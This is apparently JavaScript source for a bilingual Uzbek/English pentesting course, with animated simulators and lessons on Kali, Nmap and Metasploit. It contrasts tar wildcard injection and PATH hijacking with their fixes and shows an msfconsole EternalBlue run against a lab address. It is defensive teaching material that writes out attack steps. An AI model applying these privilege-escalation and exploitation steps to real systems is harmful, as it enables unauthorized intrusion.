function WildcardInjectionSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const VULN=[
    {col:BL,uz:"Root cron: cd /var/www/html && tar czf backup.tar.gz *",en:"Root cron: cd /var/www/html && tar czf backup.tar.gz *",duz:"* — shell buni papkadagi barcha fayl nomlariga kengaytiradi.",den:"* — the shell expands this to every filename in the folder."},
    {col:AM,uz:"Foydalanuvchi ikkita maxsus nomli fayl yaratadi: --checkpoint=1 va --checkpoint-action=exec=sh rev.sh",en:"The user creates two specially-named files: --checkpoint=1 and --checkpoint-action=exec=sh rev.sh",duz:"Bu papka www-data yoki hamma uchun yoziladigan bo'lgani uchun mumkin bo'ladi.",den:"Possible because this folder is writable by www-data or everyone."},
    {col:AM,uz:"Shell * ni kengaytirganda, tar bu fayl nomlarini HAQIQIY BAYROQ deb qabul qiladi",en:"When the shell expands *, tar interprets these filenames as REAL FLAGS",duz:"tar buyruq argumentlari va fayl nomlarini farqlay olmaydi — ikkalasi ham matn.",den:"tar can't distinguish command flags from filenames — both are just text."},
    {col:D,uz:"☠ Cron ishga tushganda tar rev.sh skriptini bajaradi — root shell keladi",en:"☠ When cron runs, tar executes rev.sh — a root shell arrives",duz:"Arxivlash buyrug'ining o'zi kodni bajarish vositasiga aylandi.",den:"The archiving command itself became a code-execution primitive.",final:true,bad:true}
  ];
  const SAFE=[
    {col:BL,uz:"Root cron: cd /var/www/html && tar czf backup.tar.gz ./*",en:"Root cron: cd /var/www/html && tar czf backup.tar.gz ./*",duz:"Bitta kichik o'zgarish: * o'rniga ./*",den:"One small change: ./* instead of *."},
    {col:AM,uz:"Foydalanuvchi xuddi shu ikkita maxsus nomli faylni yaratadi",en:"The user creates the exact same two specially-named files",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmaydi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"./  prefiksi tufayli fayl nomlari endi «-» bilan boshlanmaydi — tar ularni oddiy nom deb biladi",en:"Thanks to the ./ prefix, the filenames no longer start with «-» — tar treats them as plain names",duz:"tar faqat «-» bilan boshlangan argumentlarni bayroq deb hisoblaydi.",den:"tar only treats arguments starting with «-» as flags."},
    {col:A,uz:"🔒 tar ularni oddiy fayl sifatida arxivlaydi — hujum ishlamaydi",en:"🔒 tar archives them as ordinary files — the attack fails",duz:"Bitta prefiks butun inyeksiya texnikasini yo'qqa chiqaradi.",den:"One prefix neutralizes the entire injection technique.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="vuln"?VULN:SAFE;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="vuln"?VULN:run==="safe"?SAFE:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu tar cron zaxirasini ikki yozilish shaklida sinang.","⬇ Pick a scenario — try the exact same tar cron backup written two ways.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="vuln"?t(lang,"✗ Yalang'och *: buyruq inyeksiyasiga ochiq","✗ Bare *: open to command injection"):t(lang,"✓ ./* prefiksi: inyeksiya bloklandi","✓ ./* prefix: injection blocked")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("vuln");setStep(-1);},style:{flex:1,padding:"9px",background:run==="vuln"?D+"22":SL2,color:run==="vuln"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ tar czf ... *","☠ tar czf ... *")),
      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 tar czf ... ./*","🔒 tar czf ... ./*"))));
}

function PathHijackSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const VULN=[
    {col:BL,uz:"SUID root dastur ichida: system(\"thm\") — TO'LIQ YO'LSIZ chaqiriladi",en:"Inside the SUID root program: system(\"thm\") — called WITHOUT a full path",duz:"Dastur o'zi «thm qayerda ekan» deb PATH ga ishonadi.",den:"The program itself trusts PATH to answer «where is thm»."},
    {col:AM,uz:"Hujumchi: export PATH=/tmp:$PATH — o'z yo'lini birinchi o'ringa qo'yadi",en:"Attacker: export PATH=/tmp:$PATH — puts their own folder first in line",duz:"Endi qidiruv /tmp dan boshlanadi, tizim papkalaridan emas.",den:"Now the search starts at /tmp, not the system folders."},
    {col:AM,uz:"/tmp/thm (aslida /bin/bash nusxasi) yaratiladi va bajarish huquqi beriladi",en:"/tmp/thm (actually a copy of /bin/bash) is created and made executable",duz:"Nom bir xil — «thm» — lekin mazmuni butunlay boshqa.",den:"The name matches — «thm» — but the contents are completely different."},
    {col:D,uz:"☠ Dastur o'zgartirilgan PATH bo'yicha /tmp/thm ni topadi va root bilan ishga tushiradi",en:"☠ The program finds /tmp/thm via the modified PATH and runs it as root",duz:"Dastur qaysi «thm» ekanini hech qachon tekshirmadi.",den:"The program never checked which «thm» it was actually running.",final:true,bad:true}
  ];
  const SAFE=[
    {col:BL,uz:"SUID root dastur ichida: system(\"/usr/bin/thm\") — TO'LIQ YO'L bilan chaqiriladi",en:"Inside the SUID root program: system(\"/usr/bin/thm\") — called WITH a full path",duz:"Dastur PATH ga umuman murojaat qilmaydi.",den:"The program never consults PATH at all."},
    {col:AM,uz:"Hujumchi xuddi shu hiyla-nayrangni sinaydi: export PATH=/tmp:$PATH",en:"The attacker tries the exact same trick: export PATH=/tmp:$PATH",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmaydi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"/tmp/thm yaratiladi, lekin dastur PATH ni umuman tekshirmaydi",en:"/tmp/thm is created, but the program never even checks PATH",duz:"O'zgartirilgan PATH dasturga ta'sir qilmaydi.",den:"The modified PATH has no effect on the program."},
    {col:A,uz:"🔒 Dastur to'g'ridan-to'g'ri /usr/bin/thm ga boradi — soxta faylimiz e'tiborsiz qoladi",en:"🔒 The program goes straight to /usr/bin/thm — our fake file is ignored",duz:"To'liq yo'l — PATH hijacking'ga qarshi eng oddiy himoya.",den:"A full path is the simplest defense against PATH hijacking.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="vuln"?VULN:SAFE;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="vuln"?VULN:run==="safe"?SAFE:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — §2 dagi 4-savolni amalda sinang: SUID dastur to'liq yo'lsiz chaqiradimi?","⬇ Pick a scenario — test §2's fourth question in action: does the SUID program call without a full path?")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0",fontFamily:"var(--font-mono)"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="vuln"?t(lang,"✗ Nisbiy chaqiruv: PATH hijacking ishlaydi","✗ Relative call: PATH hijacking works"):t(lang,"✓ To'liq yo'l: PATH hijacking ishlamaydi","✓ Full path: PATH hijacking fails")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("vuln");setStep(-1);},style:{flex:1,padding:"9px",background:run==="vuln"?D+"22":SL2,color:run==="vuln"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ system(\"thm\")","☠ system(\"thm\")")),
      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 system(\"/usr/bin/thm\")","🔒 system(\"/usr/bin/thm\")"))));
}

function LessonL01(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Kali Linux nima?","What is Kali Linux?")),
    React.createElement(P,null,t(lang,"Kali Linux — kiberxavfsizlik, penetratsion test va raqamli forensika uchun maxsus yaratilgan Debian asosidagi operatsion tizim. Uni pentester'ning \"asboblar qutisi\"ga o'xshating: 600 dan ortiq xavfsizlik vositasi oldindan o'rnatilgan holda keladi. Oddiy operatsion tizim (Windows, Ubuntu) kundalik ishlar uchun mo'ljallangan bo'lsa, Kali xavfsizlikni tekshirish uchun optimallashtirilgan.","Kali Linux is a Debian-based operating system built specifically for cybersecurity, penetration testing and digital forensics. Think of it as a pentester's \"toolbox\": over 600 security tools come pre-installed. Where a regular OS (Windows, Ubuntu) is designed for everyday work, Kali is optimized for testing security.")),
    React.createElement(P,null,t(lang,"Kali'ni Offensive Security kompaniyasi ishlab chiqadi — bu OSCP kabi nufuzli sertifikatlar egasi bo'lgan tashkilot. Kali 2013-yilda paydo bo'lgan va o'zidan oldingi BackTrack Linux'ning davomchisidir. U butunlay bepul va ochiq kodli.","Kali is developed by Offensive Security — the organization behind respected certifications like the OSCP. Kali appeared in 2013 as the successor to BackTrack Linux. It is completely free and open source.")),
    React.createElement(H2,{num:"§2"},t(lang,"Nega aynan Kali?","Why Kali?")),
    React.createElement(LayerStack,{layers:[
      {n:"🧰",name:t(lang,"600+ vosita","600+ tools"),color:"#a855f7",desc:{uz:"Nmap, Metasploit, Burp, Wireshark — hammasi tayyor, sozlashsiz.",en:"Nmap, Metasploit, Burp, Wireshark — all ready, no setup."}},
      {n:"🐧",name:t(lang,"Debian asosida","Debian-based"),color:"#4dabf7",desc:{uz:"Barqaror yadro, apt paket menejeri, ulkan hamjamiyat va hujjatlar.",en:"Stable kernel, apt package manager, huge community and docs."}},
      {n:"🎯",name:t(lang,"Xavfsizlikka yo'naltirilgan","Security-focused"),color:"#69db7c",desc:{uz:"Menyu pentest bosqichlariga ajratilgan; kernel monitor rejimni qo'llaydi.",en:"The menu is grouped by pentest phase; the kernel supports monitor mode."}},
      {n:"🔄",name:t(lang,"Rolling release","Rolling release"),color:"#ffd43b",desc:{uz:"Doimiy yangilanadi — vositalar har doim eng so'nggi versiyada.",en:"Continuously updated — tools stay on the newest versions."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Interaktiv simulyator: bir xil vazifa, ikki muhit","Interactive simulator: same task, two environments")),
    React.createElement(P,null,t(lang,"Ikkala ssenariyni sinang — SSH loginni tekshirish vazifasi oddiy OS'da va Kali'da qanchalik farqli boshlanishini ko'ring:","Try both scenarios — see how differently the exact same «test an SSH login» task starts on a regular OS versus on Kali:")),
    React.createElement(KaliVsRegularSim),
    React.createElement(H2,{num:"§4"},t(lang,"Kali va boshqa distributivlar","Kali vs other distros")),
    React.createElement(P,null,t(lang,"Kali kundalik foydalanish uchun mo'ljallanmagan. U hujum vositalariga to'la va tarixan root sifatida ishlagan (endi oddiy foydalanuvchi standart). Agar sizga faqat Linux o'rganish kerak bo'lsa — Ubuntu yaxshiroq. Agar yengilroq pentest distributivi kerak bo'lsa — Parrot OS muqobil. Kali'ning kuchi — professional pentest va CTF uchun tayyor, izchil muhit, xuddi simulyatordagi kabi vosita va ma'lumot doim tayyor turadi.","Kali is not meant for daily use. It is packed with attack tools and historically ran as root (a normal user is now the default). If you just want to learn Linux, Ubuntu is better. If you want a lighter pentest distro, Parrot OS is an alternative. Kali's strength is being a ready, consistent environment for professional pentesting and CTFs — just like the simulator showed, the tool and the data are always ready.")),
    React.createElement(H2,{num:"§5"},t(lang,"Kali'ning turli nashrlari","Kali's editions")),
    React.createElement(P,null,t(lang,"Kali bir necha shaklda keladi: to'liq Installer (kompyuterga o'rnatish uchun), Live (o'rnatmasdan USB'dan ishga tushirish), WSL (Windows ichida), ARM (Raspberry Pi), bulut (AWS/Azure) va hatto NetHunter — Android telefonlar uchun mobil pentest platformasi. Har biri bir xil vositalarga ega, faqat ishga tushirish usuli farq qiladi.","Kali comes in several forms: the full Installer (to install on a computer), Live (boot from USB without installing), WSL (inside Windows), ARM (Raspberry Pi), cloud (AWS/Azure), and even NetHunter — a mobile pentest platform for Android phones. Each has the same tools, only the way you run it differs.")),
    React.createElement(H2,{num:"§6"},t(lang,"Versiyani tekshirish","Checking the version")),
    React.createElement(Terminal,null,"cat /etc/os-release      # distributiv nomi va versiyasi\nuname -a                 # kernel versiyasi\n# Kali GNU/Linux Rolling ...\n\n# Vositalar ro'yxatini yangilash\nsudo apt update && sudo apt full-upgrade -y"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Kali kuchli vosita — undagi vositalarni faqat o'zingizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz foydalanish ko'p mamlakatda jinoiy javobgarlikka olib keladi.","Kali is a powerful tool — use its tools only on systems you own or have written permission to test. Unauthorized use is a criminal offense in many countries.")),
    React.createElement(H2,{num:"§7"},t(lang,"Pentest bosqichlari va Kali menyusi","Pentest phases and the Kali menu")),
    React.createElement(P,null,t(lang,"Kali'ning kuchi shundaki, uning ilova menyusi tasodifiy emas — u pentest jarayonining bosqichlariga qarab tartiblangan. Har bir bosqich uchun tayyor vositalar bor, shuning uchun ish oqimini boshidan oxirigacha bir tizimda bajarasiz.","Kali's strength is that its application menu is not random — it is organized by the phases of the pentest process. Each phase has ready tools, so you run the whole workflow end to end in one system.")),
    React.createElement(FlowSteps,{color:"#a855f7",title:{uz:"Pentest ish oqimi",en:"The pentest workflow"},steps:[{icon:"🔍",text:{uz:"Ma'lumot to'plash (recon) — nishon haqida bilib olish",en:"Reconnaissance — learn about the target"}},{icon:"📡",text:{uz:"Skanerlash — ochiq portlar va xizmatlar",en:"Scanning — open ports and services"}},{icon:"💥",text:{uz:"Ekspluatatsiya — zaiflikdan foydalanish",en:"Exploitation — abuse a vulnerability"}},{icon:"🔑",text:{uz:"Post-exploitation — imtiyozni oshirish, tarqalish",en:"Post-exploitation — escalate, pivot"}},{icon:"📄",text:{uz:"Hisobot — topilmalarni hujjatlashtirish",en:"Reporting — document the findings"}},]}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: versiyani aniqlash","Practice: identify the version")),
    React.createElement(P,null,t(lang,"Har bir pentestni tizimni tanishdan boshlang. Quyidagi buyruqlar Kali versiyasi va yadrosini ko'rsatadi — bu vositalar mosligini va yangilanish zarurligini aniqlashga yordam beradi.","Start every pentest by getting to know the system. The commands below show the Kali version and kernel — which helps confirm tool compatibility and whether an update is needed.")),
    React.createElement(Terminal,null,"cat /etc/os-release\n# PRETTY_NAME=«Kali GNU/Linux Rolling»\n# ID=kali   VERSION=«2024.1»\nuname -r\n# 6.6.9-amd64\nwhoami\n# kali   (root emas — endi standart)"),
    React.createElement(Quiz,{q:{uz:"Kali Linux qaysi distributiv asosida qurilgan?",en:"Kali Linux is built on which distribution?"},opts:[{uz:"Debian",en:"Debian"},{uz:"Windows",en:"Windows"},{uz:"Arch",en:"Arch"},{uz:"macOS",en:"macOS"}],correct:0,exp:{uz:"Kali Debian asosida qurilgan — shu sababli apt paket menejeridan foydalanadi va Debian barqarorligini meros qilib oladi.",en:"Kali is built on Debian — which is why it uses the apt package manager and inherits Debian's stability."}}));
}
function LessonL11(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nmap nima?","What is Nmap?")),
    React.createElement(P,null,t(lang,"Nmap (Network Mapper) — tarmoqni kashf qilish va xavfsizlik auditi uchun eng mashhur ochiq kodli vosita. U qaysi xostlar tirik ekanini, qaysi portlar ochiqligini, ular ortida qanday xizmat va versiyalar ishlayotganini, hatto operatsion tizimni ham aniqlaydi. Pentestda deyarli har bir ish Nmap bilan boshlanadi — u nishonning \"xaritasi\"ni chizadi.","Nmap (Network Mapper) is the most popular open-source tool for network discovery and security auditing. It reveals which hosts are alive, which ports are open, what services and versions run behind them, and even the operating system. In a pentest almost every engagement starts with Nmap — it draws the \"map\" of the target.")),
    React.createElement(H2,{num:"§2"},t(lang,"Skan qanday ishlaydi","How a scan works")),
    React.createElement(FlowSteps,{title:{uz:"Nmap skan jarayoni",en:"Nmap scan process"},steps:[
      {icon:"📡",text:{uz:"Tirik xostlarni topish (host discovery)",en:"Discover live hosts (host discovery)"}},
      {icon:"🚪",text:{uz:"Har portga so'rov yuborish",en:"Send a probe to each port"}},
      {icon:"🔎",text:{uz:"Javob → open / closed / filtered",en:"Response → open / closed / filtered"}},
      {icon:"🏷",text:{uz:"Ochiq portda xizmat + versiya aniqlanadi (-sV)",en:"Service + version detected on open ports (-sV)"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Skan turlari va ular orasidagi tanlov","Scan types and the tradeoffs")),
    React.createElement(LayerStack,{layers:[
      {n:"-sS",name:t(lang,"SYN (yashirin)","SYN (stealth)"),color:"#69db7c",desc:{uz:"To'liq ulanish o'rnatmaydi (yarim ochiq) — tez, loglarda kamroq ko'rinadi. root kerak.",en:"Never completes the handshake (half-open) — fast, less visible in logs. Needs root."}},
      {n:"-sT",name:"TCP Connect",color:"#4dabf7",desc:{uz:"To'liq ulanish — root shart emas, lekin loglarda aniq ko'rinadi.",en:"Full connection — no root needed, but clearly logged."}},
      {n:"-sU",name:"UDP",color:"#a855f7",desc:{uz:"UDP portlari (DNS, SNMP, DHCP) — sekin, lekin muhim.",en:"UDP ports (DNS, SNMP, DHCP) — slow but important."}},
      {n:"-sV / -O",name:t(lang,"Versiya / OS","Version / OS"),color:"#ffd43b",desc:{uz:"Xizmat versiyasi va operatsion tizimni aniqlaydi.",en:"Detects service version and the OS."}},
    ]}),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: kim sizni sezadi?","Interactive simulator: who notices you?")),
    React.createElement(P,null,t(lang,"Xuddi shu portni ikki xil skan bilan tekshiring — natija (ochiq/yopiq) bir xil chiqadi, lekin nishon tomonidan sezilish darajasi butunlay boshqacha:","Probe the exact same port with two different scans — the result (open/closed) comes out the same, but how visible you are to the target is completely different:")),
    React.createElement(ScanStealthSim),
    React.createElement(H2,{num:"§5"},t(lang,"Tezlik shablonlari (timing)","Timing templates")),
    React.createElement(P,null,t(lang,"Nmap ning tezligini -T0 dan -T5 gacha shablonlar boshqaradi. -T0/-T1 juda sekin va yashirin (IDS'dan qochish uchun), -T3 standart (muvozanatli), -T4 tez (barqaror tarmoqlarda odatiy tanlov), -T5 juda tez (lekin natijalar noaniq bo'lishi va nishonni ishdan chiqarishi mumkin). Yashirinlik kerak bo'lsa sekin, tezlik kerak bo'lsa -T4 tanlanadi.","Nmap's speed is controlled by templates from -T0 to -T5. -T0/-T1 are very slow and stealthy (to evade IDS), -T3 is the default (balanced), -T4 is fast (the usual choice on stable networks), -T5 is very fast (but results can be unreliable and it may overwhelm the target). Choose slow for stealth, -T4 for speed.")),
    React.createElement(H2,{num:"§6"},t(lang,"NSE skriptlar va chiqish formatlari","NSE scripts and output formats")),
    React.createElement(P,null,t(lang,"Nmap Scripting Engine (NSE) — Nmap'ni oddiy skanerdan zaiflik detektoriga aylantiradi. -sC standart skriptlarni ishga tushiradi, --script vuln ma'lum zaifliklarni tekshiradi. Natijalarni saqlash uchun: -oN oddiy matn, -oX XML (boshqa vositalar uchun), -oG grep uchun qulay, -oA hammasini birdan. Katta pentestda natijalarni doim faylga saqlang.","The Nmap Scripting Engine (NSE) turns Nmap from a simple scanner into a vulnerability detector. -sC runs default scripts, --script vuln checks for known vulnerabilities. To save results: -oN plain text, -oX XML (for other tools), -oG grep-friendly, -oA all at once. In a real pentest, always save results to a file.")),
    React.createElement(Terminal,null,"nmap -sV -sC -T4 10.0.0.5           # versiya + skriptlar\nnmap -sn 10.0.0.0/24                # faqat tirik xostlar\nnmap -p- 10.0.0.5                   # barcha 65535 port\nnmap --script vuln 10.0.0.5         # zaifliklarni tekshirish\nnmap -sV -oA scan_result 10.0.0.5   # 3 formatda saqlash"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Nmap ni faqat o'zingizga tegishli yoki yozma ruxsat berilgan tizimlarda ishlating. Ruxsatsiz skanerlash ko'p mamlakatda qonunga zid.","Only run Nmap on systems you own or have written authorization to test. Unauthorized scanning is illegal in many countries.")),
    React.createElement(H2,{num:"§7"},t(lang,"Skan turlarini solishtirish","Comparing scan types")),
    React.createElement(CompareCols,{left:{title:{uz:"-sS (SYN)",en:"-sS (SYN)"},color:"#69db7c",rows:[{uz:"Yarim ochiq — ulanishni tugatmaydi",en:"Half-open — never completes the handshake"},{uz:"Tez va yashirinroq",en:"Fast and stealthier"},{uz:"root huquqi kerak",en:"Needs root"},]},right:{title:{uz:"-sT (Connect)",en:"-sT (Connect)"},color:"#ffd43b",rows:[{uz:"To'liq TCP ulanish",en:"Full TCP connection"},{uz:"Sekinroq, logga tushadi",en:"Slower, gets logged"},{uz:"root shart emas",en:"No root required"},]}}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: xizmatlarni aniqlash","Practice: service detection")),
    React.createElement(P,null,t(lang,"-sV har ochiq portning ortidagi dastur va uning VERSIYASINI aniqlaydi. Bu eng muhim qadam, chunki aniq versiya ma'lum zaifliklarni (searchsploit) qidirishga yo'l ochadi.","-sV identifies the program behind each open port and its VERSION. This is the key step, because an exact version opens the door to searching known vulnerabilities (searchsploit).")),
    React.createElement(Terminal,null,"nmap -sV -T4 10.0.0.5\n# PORT     STATE SERVICE VERSION\n# 22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu\n# 80/tcp   open  http    Apache httpd 2.4.29\n# 445/tcp  open  microsoft-ds Samba smbd 4.7.6\n# → keyingi qadam: searchsploit apache 2.4.29"),
    React.createElement(Quiz,{q:{uz:"Nmap -sV bayrog'i nima qiladi?",en:"What does the Nmap -sV flag do?"},opts:[{uz:"Faqat ping",en:"Only pings"},{uz:"Ochiq portdagi xizmat va versiyani aniqlaydi",en:"Detects the service and version on an open port"},{uz:"Faylni o'chiradi",en:"Deletes a file"},{uz:"VPN yoqadi",en:"Enables a VPN"}],correct:1,exp:{uz:"-sV ochiq port ortidagi xizmat va uning aniq versiyasini aniqlaydi — bu ma'lum zaifliklarni (CVE) izlash uchun asos.",en:"-sV detects the service and its exact version behind an open port — a basis for finding known vulnerabilities (CVEs)."}}));
}
function LessonL21(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Metasploit nima?","What is Metasploit?")),
    React.createElement(P,null,t(lang,"Metasploit — dunyodagi eng mashhur ekspluatatsiya frameworki. U ma'lum zaifliklardan foydalanish uchun minglab tayyor modul, payload va yordamchi vositalarni bitta tizimga birlashtiradi. Uni pentesterning \"universal quroli\"ga o'xshating: zaiflik topilsa, ehtimol Metasploit'da unga mos modul bor. Bu faqat ta'lim va ruxsat berilgan pentest uchun mo'ljallangan.","Metasploit is the world's most popular exploitation framework. It unites thousands of ready modules, payloads and auxiliary tools into one system. Think of it as a pentester's \"universal weapon\": if a vulnerability is found, Metasploit probably has a matching module. It is intended for education and authorized pentesting only.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ekspluatatsiya oqimi","The exploitation flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"msfconsole ish oqimi",en:"msfconsole workflow"},steps:[
      {icon:"🔎",text:{uz:"search — mos modulni topish",en:"search — find a matching module"}},
      {icon:"🎯",text:{uz:"use — modulni tanlash",en:"use — select the module"}},
      {icon:"⚙",text:{uz:"set RHOSTS/LHOST — parametrlarni sozlash",en:"set RHOSTS/LHOST — configure options"}},
      {icon:"💥",text:{uz:"run — ekspluatatsiyani ishga tushirish",en:"run — launch the exploit"}},
      {icon:"🐚",text:{uz:"Muvaffaqiyatli bo'lsa → Meterpreter sessiyasi",en:"On success → a Meterpreter session"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Modul turlari","Module types")),
    React.createElement(LayerStack,{layers:[
      {n:"exploit",name:t(lang,"Ekspluatatsiya","Exploit"),color:"#ff3a5e",desc:{uz:"Muayyan zaiflikdan foydalanuvchi kod.",en:"Code that leverages a specific vulnerability."}},
      {n:"payload",name:"Payload",color:"#a855f7",desc:{uz:"Muvaffaqiyatdan keyin nishonda bajariladigan yuk (reverse shell).",en:"The load run on the target after success (reverse shell)."}},
      {n:"aux",name:t(lang,"Yordamchi","Auxiliary"),color:"#4dabf7",desc:{uz:"Skaner, fuzzer, sniffer — ekspluatatsiyasiz vositalar.",en:"Scanners, fuzzers, sniffers — non-exploit tools."}},
      {n:"post",name:t(lang,"Post","Post"),color:"#69db7c",desc:{uz:"Kirishdan keyingi amallar (ma'lumot yig'ish, privesc).",en:"Post-access actions (data collection, privesc)."}},
    ]}),
    React.createElement(H2,{num:"§4"},t(lang,"Sessiya, shell va Meterpreter","Sessions, shells and Meterpreter")),
    React.createElement(P,null,t(lang,"Ekspluatatsiya muvaffaqiyatli bo'lsa, siz nishonda \"sessiya\" olasiz. Oddiy shell — bu shunchaki buyruq qatori kirishi. Meterpreter esa Metasploit'ning maxsus, kuchli payload'i: u xotirada ishlaydi (diskka yozmaydi, aniqlanishi qiyin) va ko'plab buyruqlar beradi — fayl yuklab olish/yuklash (download/upload), ekran surati (screenshot), klaviatura yozuvi, va imtiyozlarni oshirishga urinish (getsystem). sessions -i bilan sessiyalar orasida almashasiz.","On a successful exploit, you get a \"session\" on the target. A plain shell is just a command-line entry. Meterpreter is Metasploit's special, powerful payload: it runs in memory (writes nothing to disk, hard to detect) and provides many commands — download/upload files, screenshot, keylogging, and attempting privilege escalation (getsystem). You switch between sessions with sessions -i.")),
    React.createElement(H2,{num:"§5"},t(lang,"Ma'lumotlar bazasi va ish maydoni","Database and workspaces")),
    React.createElement(P,null,t(lang,"Metasploit PostgreSQL ma'lumotlar bazasi bilan ishlaydi (avval sudo systemctl start postgresql). Baza natijalarni (topilgan xostlar, portlar, ma'lumotnomalar) saqlaydi — bu katta pentestda juda muhim. workspace buyrug'i bilan har mijoz/loyiha uchun alohida ish maydoni yaratasiz, shunda ma'lumotlar aralashmaydi. db_nmap esa Nmap natijalarini to'g'ridan-to'g'ri bazaga yozadi.","Metasploit works with a PostgreSQL database (first sudo systemctl start postgresql). The database stores results (found hosts, ports, credentials) — very important on a large pentest. With the workspace command you create a separate workspace per client/project so data doesn't mix. db_nmap writes Nmap results straight into the database.")),
    React.createElement(Terminal,null,"sudo systemctl start postgresql\nmsfconsole -q\nsearch ms17-010\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.0.0.5\nset LHOST 10.0.0.10\nrun\n# sessiyada:\nsessions -i 1\nmeterpreter > getuid"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Metasploit ni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda ishlating. Ruxsatsiz foydalanish jinoyat.","Only use Metasploit in your own lab or on written-authorized targets. Unauthorized use is a crime.")),
    React.createElement(H2,{num:"§6"},t(lang,"Bind va reverse shell","Bind vs reverse shell")),
